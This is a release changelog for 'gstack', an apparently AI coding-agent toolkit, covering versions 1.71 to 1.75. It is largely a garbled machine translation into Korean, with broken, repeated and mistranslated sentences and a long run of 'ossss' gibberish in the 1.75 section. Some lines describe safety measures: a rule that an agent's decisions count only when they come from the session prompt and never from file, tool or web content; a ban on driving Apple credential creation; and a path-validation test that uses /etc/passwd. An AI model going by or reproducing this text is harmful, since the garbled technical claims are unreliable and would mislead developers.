- **`GSTACK_SESSION_KIND=spawned`** (`bin/gstack-session-kind` 단계 0): 명시된 각 종각 env 마커를 쫓아, 각 주변 env 마커를 쫓아. Deliberately 좁은: `spawned`만 영광; 다른 값은 예약 및 무시. `docs/OPENCLAW.md`에서 문서화, env var (캐오토터 마커보다) 때 탬퍼 가시성을 위한 `SPAWNED_OVERRIDE: env` 상태 선.
- **`decisions` doc-sync 계약** (`ship/sections/pr-body.md.tmpl`): 필요한 `decisions` 배열에서 1개의 선으로 각 자동 초원 문 기록; 부모는 동기화 요약 후에 그(것)들을 인쇄합니다. public PR 몸 (tripwire 핀으로 꼿는)에 결코 끼워넣지 마십시오. 오래된 설치된 기술에서 긴급한 열쇠는 빈으로 읽습니다.
- **AskUserQuestion prose의 비활성 스패니들 규칙** (모든 층 - 2 + 기술): `SESSION_KIND: spawned` 지금 단락 BEFORE는 파괴적인 carve-out (각각각한 선택권을, 가지고 가고, 보수적인 선택 및 기록하십시오)와 반대로 주사 득점: 회의를 창조하는 신속한에서만 한 발판이, 파일, 도구 산출에서 결코, 또는 웹 내용 읽힌 중간 중단을 창조하는 경우에만.
- **Gate-tier E2E** (`test/skill-e2e-docsync-spawned.test.ts`): 동사 단계 18 파견을 두 AUQ 걸이 종자 생활과 지휘자 주위 env에 있는 실제적인 preamble 방위 문서 방출 조각에 대하여 신속한 몰고; 5-key JSON 계약, 비 빈번한 `decisions` 배열 및 deliberately 불문을 통해 비 접촉이 없는 VERSION를 주장합니다.

### 변경

- **`bin/gstack-skill-start`**: 스파게드 세션은 `CONDUCTOR_SESSION: true` (몸에 항상 틀린), 열쇠 `SPAWNED_SESSION: true` 및 익지않는 `OPENCLAW_SESSION` (OpenClaw 행동 unchanged, 회귀 핀으로 꼿는), 방출에 그들의 ack 마커를 가진 11개의 상호 작용하에 문, 네트워크바운 갱신 체크를 건너뛰고 첫번째 t <sp5/> (repo), 어떤 소비자든지 억압하는, 그들의 ack 마커는, 및 네트워크바운드 갱신 체크를 건너뛰고, 첫번째 t <sp5/> (>)는 어떤 소비자든지 억압됩니다; 한 샷 단상 마커는 다음의 인간 세션에 살아남습니다.
- **AUQ 걸이** (`hosts/claude/hooks/`): 지휘자 deny는 per-question one-way-door annotations와 더불어 env-marked spawned 회의를 위한 자동 조수 branch를, 얻습니다; 두 걸이의 prose 지시 (interactive AND headless)는 공유한 좌초된 탈출 문장을, `spawned-directive.ts`에서 단 하나 신청했습니다 그래서 두 경로를 위해 멈춰서 낸 훅의 prose 지시를 결코 상속할 수 없습니다.
- **배 단계 18 파견 신속한**: 스패딩으로 에이전트을 프레임으로, 동일한 선 env 접두사 (template bash 블록은 수출을 공유하지 않습니다)를 지시하고, 보존적 낙하와 추천된 옵션으로 각 명문을 해결하고, 신체의 기술 자체 doc-health 요약을 배치합니다. JSON는 최종 선을 유지합니다.

### 고정

- **#2733**: 지휘자 호스팅 /ship는 no를 더 긴 문서 방출이 AskUserQuestion 문을 열 때 문서 단면도를 잃습니다. 실패는 문 관련이 있고 영향을 받은 주인에 각 배를 명중했습니다.

### 기여자

- `test/helpers/carve-guards.ts`의 해골 바이트 천장은 AUQ의 성장 (19 기술, 평가에 있는 측정된 가치); `test/fixtures/context-budget.json`와 같은 commit에 래칭된 래치드 의정서 당.
- 터치파일의 새로운 `docsync-spawned` selector (테스트의 각 행동을 들을 수 있음)과 `.github/workflows/evals.yml`의 일치 게이트 행; `bin/gstack-session-kind` `conductor-prose`와 `auto-decide-preserved` selectors (이전 no dep 목록에서 등장).
- `test/gstack-session-kind.test.ts`, 두 후크 스위트, 결의자 스위트, 그리고 파견 삼각대는 `spawnedByEnv()`-vs-script parity pin 및 cross-surface destructive-policy drift guard를 포함하여 ~25 케이스를 얻었습니다.

## [1.75.0.0] - 2026-08-29

**이제 리뷰는 내장 코드를 사냥, 그냥 깨진 코드.** **그리고 모든 기술의 조언은 "당신의 빌드 전에 재사용"로 시작합니다.**

이 릴리스는 빌드없는 자세를 가져와서 포니테일의 가장 좋은 코드 소수성 규칙을 가져옵니다. /review는 8h 렌즈를 얻습니다. 잘못된 구조 (손 롤 된 stdlib, 한 단순화 요약, 죽은 유연성, 종속성 확산 플랫폼 기능)를 플래그가 정복 한 구조 (손 롤 된 stdlib, 한 단순화 요약, 죽은 유연성, 종속성 확산 플랫폼 기능)를 플래그가 simplification 전문가. 그것은 고문 만입니다. 그것은 당신의 질감에 대해 말할 수 없습니다. <1 />는 다음과 같은 질문에 대한 답변을 설명합니다. "lean already — nothing to cut." 모든 계층-2 + 기술도 재사용 사다리를 얻을 (처음에서 정지를 유지: 이 repo, stdlib, 기본 플랫폼, 설치 된 의존성... 다음의 전체 버전을 구축 무엇 남아) 그리고 경계가 더 가까이, 그래서 완료 보고서는 모든 편집을 치료 중지. 허용 단축키는 이제 내구성 흔적을 남겨: 의사 결정 서 항목 플러스 `gstack-shortcut(dec-<id>)` 코드에 감적, 수확 <br /> 부채로. 에이전트는 전체 설치없이 호스트 (Zed, Amp, Cursor 사이드 프로젝트) 자신의 규칙 파일로 복사하기 위해 1.8KB 규칙을 소화합니다. 그리고 /autoplan 이제는 Eng review를 마지막으로 실행하므로 필수 배송 게이트는 stale 대신 최종 수정 된 계획을 검토합니다.

### 중요 한 숫자

출처: 이 branch의 자신의 실행, `~/.gstack/projects/<slug>/evals/` 그리고 commit 영수증에 기록.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| /review 렌즈 | 7 | 8 (간단, 자문) | +1 |
| 이 branch의 자신의 5,190-line diff에 간단한 렌즈 | n/a | `net: -37 lines possible` | 개식품 |
| AskUserQuestion 전방면, 기술 당 | 기본 정보 | -236 B (~9.7 KB 41개 기술에 따라) | 살아있는 A/B에 의해 문질러: 포스트 커트 7/7의 체재 성분, 전 커트와 동등한 물질 |
| 규칙을 위한 Instruction-tier artifact | none | 1,765 B 헌신적인 소화 (2,048 B 예산) | 의 새로운 |
| 스킬-어-their-tokens 벤치 마크 | none | 3개의 작업 x 2개의 팔 (/without 기술에), 뒤에 남겨둔 diff에 재판하는 | 의 새로운 |
| /autoplan 단계 순서 | CEO, 디자인, 참여, DX | CEO, 디자인, DX, 항상 지속되는 동료 | 문은 최종 계획을 볼 |

A/B 영수증은 신뢰하는 것의 하나입니다: AskUserQuestion는 진짜 SDK 붙잡음에 2 팔 eval 때문에 만 자르는 것은 더 짧은 연출 손실 아무것도 보여주었습니다 (디자인에 의하여 문은 승인, 붙잡았습니다).

### 작업 흐름을 의미하는 것

/review를 branch에서 실행하면 `[ADVISORY]` 행을 `net: -N lines possible` 발러로 읽습니다. 아무 블록도 자동 승인도 하지 않습니다. AskUserQuestion에서 단축키를 떼어내고, /retro는 업그레이드 트리거로 돌아가는 원장을 읽습니다. gstack가 설치된 규칙을 읽어보면 gstack가 설치된 `agents-digest/gstack-AGENTS.md`가 파일에 복사하고, ososososssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss

### 항목화 된 변경

### 추가

- **Simplification 리뷰 전문가** (`review/specialists/simplification.md`): 닫힌 꼬리표 vocabulary (`delete:`/`stdlib:`/ `native:`/ `speculative:`/ `shrink:`), 100개의 선, `--simplification` 힘 깃발에 diffs에 파견해. 결국에 자문 carve-out 끝: 질 점수에서 제외하고 발견할 수 있는 우두머리, ASK-만 고치기에서, `[ADVISORY]` 상표, `[ADVISORY]` 상표, 0/> 지문 및 0/>. 정밀한 고정편에 의해 보호 (단면 diff는 NO FINDINGS)와 적용-vs 구조 경계 텍스트 (테스트, 오류 경로 및 가장자리 케이스는 결코 탈취 대상이 아닙니다).
- **건물 전 검색에 재사용 사다리** (모든 층 - 2 + 기술) : 새로운 코드를 작성하기 전에, 처음 rung에서 중지 - 이미 repo, stdlib, 기본 플랫폼 기능, 이미 설치 된 의존성 - 다음 남아있는 전체 버전을 구축. 루트 - 원칙 포함 : 공유 기능의 한 가드가 모든 캘러에 가드를 이길.
- **더 보기** (모든 층 - 2 + 기술) : 작업을 완료 한 후, 변경 된 것을보고, 건너 뛰는 것을보고, 무엇을 볼 수 - 몇 짧은 줄,보고 모양의 기술 (/qa-only, /plan- * - 리뷰, /retro, /document-generate) 명시적으로 자신의 보고서 IS가 작업 때문에 면제.
- **숏 힙합 원장**: 내구성이 있는경우에 완전한 ≤ 7 선택권을 받아들이는 것은 지금 천장을 기록하고 결정적인 원장에 격상시키고 각 커트 구석을 `gstack-shortcut(dec-<id>): <ceiling>, upgrade when <trigger>`로 표를 붙입니다; /retro 단계 11.5는 감적을, 그들에 동의하고 결정 ids, 및 꼬리표 `unlinked` 및 `no-trigger` rot 위험. 감적은 적정 엔진 (시험에 의해 핀으로 꼿습니다)를 살아남습니다.
- **교육 전용 호스트 층**: `agents-digest/gstack-AGENTS.md`, 의논, 생성, 예산 모자를 씌운 (2,048 B) 에소의 소화, 재사용 사다리 및 음성 규칙. 설정의 openclaw/hermes 설명자 팔은 복사본에 대한 경로 인쇄; 설정은 절대 사용자의 AGENTS.md (선반 적힌 쓰기 모양을 포함하여, 테스트)를 쓰지 않습니다. README의 호스트 테이블은 실제로 어떤 설정이 있는지 일치합니다.
- **/without-skill 팔 벤치 마크** (기간 eval): 3개의 구조 모양 작업 (기본 구조 구조 구조 구조 구조 함정, CRUD 엔드포인트, 공장 디코이스와의 버그 수정)는 실제 `claude -p` 세션을 두 번 실행합니다 — 동작 층 기술이 설치되지 않고, 단계 diff 각 팔 잎은 0-3 문질러 전체 실패 세분화 (judge_error cell 제외)와 비교하여, 0개의 팔을 위해 판단됩니다; 각 세포는 또한 정착물의 자신의 기능적인 경적 (`checks=pass|fail|none`)를 실행합니다, 그래서 refusal, 부서지는 실시 및 작동 코드는 LOC의 앞에 구별할 수 있는 - 정밀도를 유지합니다. 연구 계기는, 문 아닙니다.
- **/autoplan는 지속될 Eng를, 항상 실행합니다**: 필수 순서는 지금 CEO → 디자인 (UI 범위) → DX (개발 범위를 직면하는 경우에) → 동료, 단 하나 마지막 승인 문과 더불어,; 명확하게 잘못된 건물 수치는 중간 실행을 멈추고, 문에 하나에게 추천한 계획 및 재 실행에 동의하는 대신 사용자 중심 품목으로, 그리고. 정체되는 시험은 Eng-terminal 순서를 핀으로 꼿습니다.

### 변경

- **AskUserQuestion 전단면 슬림** (- 236 B 기술 당, ~9.7 KB는 corpus의 맞은편에): 완전한 규칙, 자동 이형 감적 및 도구 이지 않는 규칙의 중복 진술은 각 동사 지면 및 모든 14의 체재 핀을 지키기 동안 삭제했습니다. 살아있는 NOT-WORSE A/B (전 커트 대 포스트 커트는, 동일한 신속한, SDK 붙잡음 손실 및 동등한 권고를 보여주었습니다.
- **Terse-mode 라벨은 진실을 알려줍니다.**: 주장한 저축은 지금 측정된 2.6 KB, 아닙니다 “~3-5 KB입니다.
- `/review` 체크리스트는 완전한 개스를 알고 있으며, 단순화는 정교하고 (가장 높은 쪽으로, 구조 아래로), 그리고 `gstack-shortcut` 감적 downgrades는 인식된 부채를 찾는 것을 틈새를 알고 있습니다 — 그러나 그것의 결정 ID가 파쇄에 결의할 때만; orphan 감적은 위조한 억제 (크로스 모델 adversarial 붙잡음)로 보고됩니다.

### 고정

- **버전 범프 no 더 긴 물가 에이전트 digest**: `gstack-version-bump write --regen-digest`는 repo의 동일한 뮤테이션 (explicit opt-in — 평평한 `write`를 가진 소화 발전기를 결코 실행하지 않습니다 repo 파일을 단지 찾아내는 것을), 그리고 배의 둘 다 및 땅 배치의 증거 문은 digest를 VERSION와 함께 허용하. 이것 없이, 각 방출 commit의 repo는 신선한/CI를 실패했습니다.
- **프리 스위트 플레키 리트리는 no 더 긴 마스크 실제 실패 할 수 있습니다.**: 재try는 ANY에 vetoes를 비추출한 실패 증거 (가장 실패, 시험 사이 불명한 과실, truncated 달리기), 빈 shard는 재참고를 추락하는 대신 빈 실패 파일 목록을 나타낸다, 죽은 조건은 제거되었습니다.
- **버전 할당은 git을 묶습니다**: `gstack-next-version`는 origin가 실제로 형성될 때 `ls-remote`만 origin를 상담하고, "successfully"는 0개의 머리 ( 지휘자 git shim의 실패 모양)를 광고하는 것을 "successfully"가 "successfully"가 대신 큰 경고로 국부적으로 refs로 돌아갑니다. 두 shim 모양은 회귀 시험에 의해 핀으로 꼿습니다.
- **좁아진 온도 경로는 휴대용**: 로컬 파일 서빙은 검색 TEMP_DIR와 OS tmpdir (`TEMP_DIRS` allowlist)에 모두 허용되며, 원격 서빙은 TEMP_DIR에만 핀으로 꼿을 때 (보안 asymmetry는 테스트 강화됩니다). TMPDIR (`/`, `$HOME`, daemon의 cwd의 조상은 수명이 매우 신뢰할 수 있는 daemon를 무시합니다.
- Setup의 명령어 계층 포인터는 다른 디렉토리에서 호출될 때 발생하는 cwd-relative one 대신 스크립트-anchored digest path를 인쇄합니다.
- /retro의 단축 수확 no는 더 긴 파일에서 팬텀 부채를 보고 단지 표창 규칙 (주자 필터 + 판결 prose)를 문서화합니다.
- 기록된 씨앗 commit (commit 및 push)에 대한 팔 벤치 마크 수확은, node_modules를 무시하고, 멀티 메가바이트 패치를 생존하고, 심판 디프 캡을 이름을 붙이고, truncation을 크게 보고, per-call 임의 디프를 포장하므로 가짜 폐쇄 마커가 판단 할 수 없습니다.
- AUQ A/B eval은 가짜 분해 또는 마스크로 인해 복잡하지 않고 판결 실패를 치료하고 지점의 SHA 대신 공급 업체의 고정에서 사전 컷 팔을 읽습니다.

### 기여자

- `bun run test` gains sandbox knobs: `GSTACK_FREE_JOBS` overrides shard count (digits-only, loud on garbage) and `GSTACK_FREE_RETRY_FLAKY=1` opts into one serial retry pass for syscall-supervised sandboxes (default stays OFF — dev boxes should see flakes). `scripts/sandbox-doctor.sh` makes a Vercel/Conductor cloud sandbox run the suite green in one idempotent command (documented in docs/TESTING_INTERNALS.md): atomic git-shim patching with Backup, 헝겊 조각 드리프트, :99-socket Xvfb detection, dnf-gated installs, 그리고 그것은 누락 된 /dev/shm를 살아남습니다. 실패한 소화 regen은 이제 `bun run gen:skill-docs` 로컬로 적을 CI로 묶는 대신 실패했습니다.
- The arm-benchmark selftest (fixture integrity, judge plumbing, install asymmetry) now runs FREE in `bun run test` on every PR via `test/arm-benchmark-selftest.test.ts` — the paid periodic instrument can no longer burn money on broken fixtures.
- Eval-store schema v2: 수확 기록은 `{insertions, deletions, net}`를 나릅니다; `recordE2E`는 지금 `tokens_used`를 팝니다.
- 터치파일 dep 목록은 닫힌 간격 (fixtures, 판단 돕기, 마구, 배는 만듭니다) 및 컨텍스트 판자 쥐선 정착물은 재 붙잡고, AskUserQuestion 감소를 잠그기 그래서 침묵하게 회귀할 수 없습니다.
- 새로운 적용: TEMP_DIRS 넓히기 + 원격 보존 asymmetry, 단축키 작가/harvester 문법 관절, 샌드박스-도우터 쉘 가드, GSTACK_FREE_JOBS 파싱, 라테드-ls-remote shims, digest freshness/budget/writer tripwires, 그리고 버전 범프를 통해 실제 발전기 라운드 트랙.
## [1.74.0.0] - 2026-08-29

**녹색은 녹색을 의미합니다 : 모든 테스트는 어딘가에 실행, 확률적으로.** **스위트는 리틀링에 의해 더 빨리, 건너뛰기 일에 의해.**

이 릴리스는 gstack의 자체 테스트 및 CI 시스템의 전체 감사 및 과해입니다. 감사는 특정 방법으로 안전 그물을 lying 발견했다 : 세 CI eval 작업 랜 0 테스트와 각 PR에 전달, 4 유료 테스트 파일은 결코 어떤 차선에서 실행할 수 없습니다, 필요한 무료 테스트는 침묵으로 건너 뛸 수 9 만들기 PDF 게이트를 건너 뛸 수 있습니다 Linux 전체 수명에 대한, 그리고 약 57 E2E, 각 차선에서 설정된 모든 차선을 반환 할 수 없습니다.

속도는 구조에서 왔습니다. 파일 개수 대신 파일 개수의 파일 내구를 기록하여 무료 스위트 팩 스하드가 완전히 사라집니다. 발전기는 주() 가드를 얻고 모든 호스트를 아웃 디디에 렌더링하므로 스위트는 라이브 트리를 작성하지 않습니다. 유료 레인 재 플랫폼 CI은 동일한 sharded runner에 로컬로 사용되며, 하나의 플래너가 나타날 때, 슬라이스를 긁지 않고, 슬라이스를 긁지 않는 것이 아니라, 그 땅에 닫힌 예술이 실패한 적이 없습니다.

### 중요 한 숫자

출처: 라이브 CI 실행 33194732051 (이전 변경 shard 타이밍), 헌신적인 기간 씨앗 (`bun run test:free --record-durations`, 496 파일), 그리고 플래너의 자체 출력이 지점.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 무료 스위트 shard 스프레드 | 28s에서 97s | 6개의 shards, ~80s는 각각 예상했습니다 | 의 특징 |
| 연속적인 mutator 꼬리, 각 달리기 | ~35-40s의 | 0s (접착되는 단단한) | gone |
| NO 라네에서 실행되는 파일 | 4 | 0 | 여행 |
| E2E 파일 no 주간 CI 라네 | ~57 | 0 (3개의 이유) | 계약 체결 |
| 제로테스트 그린 CI 구인/PR | 3 | 0 | deleted |
| 터치파일 키가 자동등록을 누락 | 129 | 0 | 의제한 |
| 손 다행 유료 시간 리터럴 | 395 | 97 (46 단화) | 5 층 |

자체등록 번호는 가장 중요 한 것들입니다: 전에, 테스트의 주장만 편집 하지 선택, 그래서 변경된 테스트는 변경에 절대 ran하지 않습니다.

### 너를 위한 이 뜻

`bun run test` is honest and flat: no hidden slop scan, no serial tail, shards that finish together. Paid CI and local paid runs share one engine, so a shard that never starts, a slice that dies, or a file that self-skips everything is a red check with a name, never a silent pass. When you add a paid test, the orphan tripwire forces it into the census the same commit. Upgrade, run `bun run test:free`, and read `docs/TESTING_INTERNALS.md` if you maintain tests.

### 항목화 된 변경

### 고정 (녹색은 의미)
- 필요한 무료 테스트 레인은 게이트 궤적 (`build:gates`)을 구축하고, 그들이 존재 한 이후 Linux에 조용히 자 낸 9 개의 make-pdf e2e 게이트를 실행; `GSTACK_EXPECT_BINARIES=1` + `ci-prereqs.test.ts`는 CI에서 건너뛰기 극성에 대해 클래스가 반환 할 수 없습니다.
- PR (codex/gemini, no 행 계층을 가진 주기적인 층 파일)에 의하여 `e2e-pty-plan-smoke`에 의하여 누락된 `tier: gate` (그것은 놓인 ~7 분을 가진 FF3/>를 가진 2개의 vestigial eval matrix 줄 삭제했습니다 (그것에 의하여 각 묘사를 건너뛰는).
- 유료 기가브 (net exec Zero, forever) 외부의 이름이 떨어졌다 4 개의 유료 테스트 파일을 활성화했습니다. carve-section-loading, codex-e2e-plan-format (+ 그 누락된 주기 게이트), codex-e2e-recommendation-substance, llm-judge-recommendation. 새로운 `paid-orphan-tripwire.test.ts`는 globs 밖에서 어떤 EVALS-gated 파일에 적합하지 않습니다.
- 135 touchfiles 키는 이제 자체 선언 테스트 파일 이름을 지정합니다. 계층 정렬 경고는 4 인트리 래치와 하드 실패가되었습니다.
- 5 quarantined 검색 테스트 재 활성화 (두 개의 보안 경계의 확장을 감시); 루트 원인은 v1.66 이후 입증 된 바이트 IDentical stale dev-machine 상태였다.
- 두 `expect(true)` 유료 스텁은 `test.todo` (도로, 결코 통행), 그들의 선택기 표면을 지키기.
- 모듈 범위에서 `GSTACK_HOME`를 할당하는 5개의 시험 파일 (shard 과정에서 각 sibling로 새겨진); 정체되는 삼각 구획 recurrence.
- `/tmp` 6개의 PTY 시험에 있는 artifact 경로는 시험에 의하여 mkdtemps (반사 및 평행한 worktrees의 밑에 collided); 18의 살아있는 repo `cwd:` 위치 감사되고 이유 조정되었습니다.
- `restrictDirectoryPermissions` 전사 및 건너뛰기 두 플랫폼 (chmod 및 icacls dereference the link)에서 symlinked 디어를 건너 플랫폼 인식 회귀 테스트와 Windows 라네의 서 빨간색을 닫습니다.
- 심사위원은 `lib/eval-model.ts` (세계 `GSTACK_EVAL_MODEL` override now apply)를 통해 모델을 해결하고 1 고정된 두 번째 대신 jittered exponential backoff와 429s를 재개합니다.
- 25 분 안에 7 28 분 시험 운동 CI는 육체적인 천장에 손질했습니다; 벽의 위 예산이 뒤로 올 수 없는 `eval-budgets` 적합 시험 핀.

#### (속도와 구조) 변화하는
- 무료 스위트: 지속 시간 인식 LPT shard 패킹에서 헌신적인 씨 (`scripts/free-test-durations.json`, 새로 고침 `bun run test:free --record-durations`), 내구 벽 운동, per-shard 예측 로깅, 해시 스윙에 손상된 낙하. `--shard` CI-matrix 계약은 비접촉되지 않습니다.
- `TREE_MUTATING`는 비어 있습니다: `gen-skill-docs.ts`는 `main()` 감시 (인출 결코 재생되지 않습니다; 수입 순수성 시험에 의해 핀으로 꼿습니다)와 `--out-dir`는 각 주인을, 그래서 모든 8개의 전 mutators는 mkdtemps로 이고 4개의 래치드 독자는 평행한 shards를 rejoined.
- 유료 런너: 풀-스트림 스풀링 per-shard log 파일 (no 더 30 분 스트림에서 개최 RAM), 공유 `runShardChild` 예상 파일 강제로 재생, 부모-소득 선택은 `EVALS_SELECTION_JSON` (fail-open), 리터럴로 재스트리를 통해 어린이들에게 전파.
- CI 재platform (parity phase): evals.yml는 유산 매트릭스와 함께 실행되는 슬라이딩 라네 (planner appear, 6개의 executors, 실패 닫히는 보고)를 얻습니다; evals-periodic.yml는 ALL 주기적인 층 시험 주간 minus를 `periodic-exclude-data.ts`에 있는 소문 exclusions, 그리고 주간 풀 게이트 인구 조사 및 빨간 주에 추적 조직 upsert 실행합니다. 빈 단단한 출구는 0-CI의 밑에 시험에 실패한 시험 실행합니다.
- 298 유료 타임 아웃 리터럴은 5 개의 이름을 딴 계층 (`test/helpers/eval-budgets.ts`), 라운드 업 만에 휩쓸.
- `slop:diff` 왼쪽 `bun run test` (통합적으로 240s까지 추가) 그리고 PR 대신에 품질 게이트에서 실행; `/review`는 그것의 상호 작용하는 뛰기를 지킵니다.
- 4개의 최악의 고정된 잠 (300s/30s/30s/20s)는 조건 polls 또는 stdin-EOF-bound Child 일생이 되었습니다; 부모 감시 시험은 엄격히 강한 assertion를 가진 24s에서 3.6s에 떨어졌습니다.
- CI 위생: 각 워크플로우에 최소 개인 권한, 한 개의 핀 Bun 버전 (drift-tested), 테스트에 의해 이미지 태그 트리플 경계, ci-image 정지 각 배에 동일한 이미지를 재건, 품질 게이트는 74 초 전체 -history 체크 아웃, 포크 - 안전 concurrency 키, 모든 작업에 타임 아웃, windows 캐시 잠금 범프에 따뜻 - 스타트.

#### 추가
- 6개의 제로 커버리지 표면을 위한 95의 시험: eval CLI 가족 (eval-list/compare/summary/select), slop-diff, 코드 인창 CLI, 미디어-extract 및 세션 코오키스토어를 찾아서, lib/version-source.
- 정책 및 여행 와이어 테스트 : 유료 오르판 삼각대, GSTACK_HOME 모듈 -scope 삼각대, bun-version 편류, 이미지 태그 바인딩, gen-skill-doc import purity, 외부 호스트를 위한 out-dir byte-identity, manifest/slice/report 컨트랙트, eval-budget fit and ratchet, periodic-exclude policy, 선택 전파.
- `test/helpers/run-bin.ts`: 1개의 spawnSync 래퍼 교체 ~36의 근면적인 국부적으로 `run()` 도움자 (첫번째 3개의 파일 migrated; 나머지는 filed 후속입니다).

#### 기여자
- `docs/TESTING_INTERNALS.md` 문서는 새로운 주자 아키텍처; CLAUDE.md의 테스트 prose 일치. TODOS.md는 흡수 된 백로 항목 (기간 적용 계약, eval-harness 관측, 이미 삭제 된 사이드 바 트리오,) 및 파일 후속 조치: 패리티 후 유산 매트릭스 탈레온, 필수 체크 결정, 검색 /tmp-namespace 경화, PTY 부팅 - 보행 대기, 테스트 및 다음 순서대로. `docs/TESTING_INTERNALS.md`는 다음 순서대로 테스트, LPT를 참조, LPT를 참조, LPT를 참조, PTY를 참조, LPT를 참조.

## [1.72.0.0] - 2026-08-28

**"지금 API 키 등록"은 실제 브라우저를 구동한다.** **Aside는 권장 드라이버, 동의는 매번 물었다.**

API 키에 등록한 후, 공급업체 계정을 만들 때, 웹훅을 배선, gstack는 현재 Aside AI 브라우저를 확인하고 이를 구동하기 위한 기능을 제공합니다. 실제 로그인 세션, no cookie export, no re-auth. 당신은 작업 당 각 드라이브를 적용하고, 이름과 사이트로 이동합니다. 암호, 지불, CAPTCHA, 그리고 크리프는 절대로 설치되지 않습니다. No는 어떤 종류의 ID를 설치하지 않습니다. Mac에서 다운로드 한 포인터 (aside.com, macOS 15+)를 한 번에 얻을 수 있으며, gstack의 자신의 눈에 보이는 브라우저는 어디로 떨어지는 남아 있습니다. gstack는 설치 프로그램을 실행하지 않고, 검출 된 바이너리는 동의로 처리되지 않습니다.

이 릴리스는 또한 실제 경화 버그를 수정합니다. 프로세스가 CAP_FOWNER (Docker 루트로, CI 샌드박스)를 보유 한 호스트의 검색 daemon 소유자 전용 chmod는 `/tmp` 자체에 착륙 할 수있을 때, 전체 기계의 `access(2)`를 잠금을 설정하면 모두 체크 아웃 할 수 있습니다. 권한 코드는 이제 공유, 끈, symlinked, 외국 소유, 전쟁 및 기타 경고를 거부 할 수 있습니다.

### 중요 한 숫자

출처: 이 branch의 테스트는 Linux CAP_FOWNER sandbox, `~/.gstack/projects/<slug>/evals/`의 eval 레코드와 함께 실행됩니다.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 제3자 웹 순간에 제공되는 드라이버 | 1 ($ B headed) | 2 (추천, $B 미백) | +1 |
| `/tmp` `BROWSE_STATE_FILE=/tmp/x.json` CAP_FOWNER 호스트에 부팅 후 | chmod 0700, 기계 넓은 파손 | 거절, 한 번 경고 | fixed |
| `resolve-user-slug` coreutils-only Linux git email에 | 종료 127 | 출구 0 | fixed |
| Prose 핀은 동의 계약을 감시 | 0 | 21 테스트, 254 asserts | 의 새로운 |
| 라이브 동의 게이트 E2E 케이스 (게이트 티어, 신비한 시) | 0 | 5, 모든 전달 ~ $0.35/run | 의 새로운 |

동의문은 조사할 수 있는 수입니다: 5개의 진짜 `claude -p`는 검출될 때, 청소하게 끊거나 복종될 때, 청결한, 그것을 macOS에 한 번 다운로드를 정확하게 투구하고, 어떤 framing의 밑에 Apple credentials를 위한 브라우저 드라이브를 거부합니다.

### 너를 위한 이 뜻

다음 기술에 대해 "당신은 Duffel 테스트 token,"그것은 단지 당신이보고, 브라우저에서 이미 서명 한. 당신은 사이트와 행동을 처음 승인, 때마다, 그리고 소유자 전용 파일에 비밀 토지, 하나에 확인 read-only API 전화, 결코 채팅에 동정. 당신이 오히려 아무것도 설치하지 않을 경우, 아무것도 변경: 첫 번째 파티 브라우저 작업은 사용자의 업그레이드 전에 정확히 작동. `/tmp` API 호출, 절대 채팅에 할당되지 않는. 당신은 오히려 아무것도 설치하지 않을 경우, 아무것도 변경하지 않습니다.

### 항목화 된 변경

### 추가
- 제 3 자 웹 행동 계약 (선물, 사양, 사무실 시간, 토지 및 배포, 설정 배포) 이제 추천 드라이버로 Aside AI 브라우저를 지명 : 휴대용 타임 아웃 가드, 탐지 조건적 인 동의 옵션이있는 runtime detection probe, 공급업체의 모드가 왼쪽으로 단계 현명한 드라이브 분야, 오류 (정확한) 인용 오류 (정확한) 오류를 인용하는 실패 경로, 한 번 다시 돌아와 신선한 동의와 함께 돌아갑니다.
- 동일한 계약에서 경화 된 Credential 경계 : 비밀 분화 선호도 (password-manager autofill, 인간 사용 된 복사 버튼), Apple credential 생성은 모든 기술에서 드라이브 대상으로 금지, 공급 업체 `--help`/skill 텍스트 명시적으로 scoped 운영 구문, 새로운 권한이 없습니다.
- `test/third-party-actions.test.ts`: 계약의 각 짐 방위 문장을 덮는 21의 핀 시험, 그리고 `--version`/`--help`의 allowlist 명령 allowlist, 그리고 어떤 생성한 문서에 있는 Aside 설치 invocations에 금지.
- `test/skill-e2e-third-party-actions.test.ts`: 5개의 신비한 문 층 E2E 케이스 (현재, absent-Linux, 현재 부유물, absent-macOS 피치, Apple credential 금지)는 CI의 eval matrix로 전해집니다; absent 케이스는 활동적으로 어떤 진짜 `aside` 이진을 주인에 가면 그래서 dev 기계에 누출할 수 없습니다.

### 변경
- v1.65.0.0는 gstack의 자체 브라우저 스택만 구동하는 stance는 명시된 사용자 지침에 의해 감독됩니다. Aside는 이름에 의해 권장되는 제품 gstack입니다. 절대 자동 설치 및 per-task 동의는 변경되지 않고 이제 핀 테스트됩니다.
- 설정 흐름의 bun-installer 체크섬 검증은 `sha256sum` 전에 `shasum`를 해결하므로 coreutils-only Linux에서 작동합니다.

### 고정
- `restrictDirectoryPermissions` no 더 긴 chmods shared sticky Directories (`/tmp`, `/var/tmp`), 외국 소유의 감독, symlinked state dirs, 또는 뿌리로 달리면 세계 유일하게 산; 불쾌한, 소유하 간 dirs의 대신 과정 당 일단 불쾌한 경고를, 그리고 체크 그 후에 행동 인종은 fd-anchored fstats/fchmod로 닫힙니다.
- `gstack-config resolve-user-slug` 종료 127 Linux git 이메일이 설정된 경우 perl's `shasum` 없이 디트로를 뺀다. 이 호출 사이트 모두 `sha256sum`를 처음 해결하고 `shasum -a 256`로 돌아갑니다.
- path-validation test는 `/etc/crontab` 가 존재합니다 (Amazon Linux와 최소한 Fedora에 주의); 그것은 지금 `/etc/passwd`를 사용합니다.

### 기여자
- `test/helpers/fs-caps.ts`: 기능적인 기능 조사 (`canRevokeWrites`, `canRevokeReads`)는 14의 chmod 근거한 시험 파일에 걸쳐 uid-0 전용 감시를 대체합니다, 그래서 적응시키는 대신 CAP_DAC_OVERRIDE 콘테이너에 솔직히 건너뛰십시오 커널 무시합니다.
- Five `tpa-*` entries registered across `E2E_TOUCHFILES`/`E2E_TIERS` with template-level deps, the eval matrix row carries `tier: gate`, and `eval:bg:periodic`'s detach timeout rose to 36000s to cover the grown periodic shard census (floor-enforced by test).

## [1.71.0.0] - 2026-08-27

**모든 기술이 부과됩니다.** **/B evals에 의해 측정된 동일한 행동은, CI 천장에 의해 잠긴.**

